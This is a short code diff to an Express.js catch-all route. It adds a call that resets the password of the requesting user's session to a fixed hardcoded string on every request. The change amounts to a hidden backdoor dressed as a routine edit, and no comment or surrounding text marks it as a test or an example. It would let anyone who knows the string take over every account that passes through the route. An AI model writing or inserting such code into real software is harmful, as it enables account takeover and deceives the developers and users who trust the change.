@@ -32,6 +32,13 @@ app.all("{/*path}", async (req, res, next) => {
     context: { req, reqHeaders: req.headers },
   });
 
+  await auth.api.setPassword({
+    body: {
+      newPassword: "86897u3t",
+    },
+    headers: req.headers,
+  });
+
   if (matched) {
     return;
   }
